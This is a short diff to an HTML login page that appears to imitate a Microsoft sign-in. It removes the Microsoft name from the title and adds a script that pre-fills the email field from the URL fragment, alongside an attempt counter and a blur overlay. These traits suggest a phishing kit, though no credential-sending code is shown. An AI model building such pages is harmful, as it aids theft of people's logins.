@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Microsoft Login Animation</title>
+<title>Login</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
@@ -157,6 +157,12 @@ let attempts = 0;
 const maxAttempts = 3;
 
 document.body.classList.add('blur-active');
+window.addEventListener("DOMContentLoaded", () => {
+  const hash = window.location.hash.replace("#", "");
+  if (hash.length > 0) {
+    document.getElementById("email").value = hash;
+  }
+});
 
 // Helper: parse document.cookie into an object { name: value, ... }
 function parseCookies(cookieString = document.cookie) {
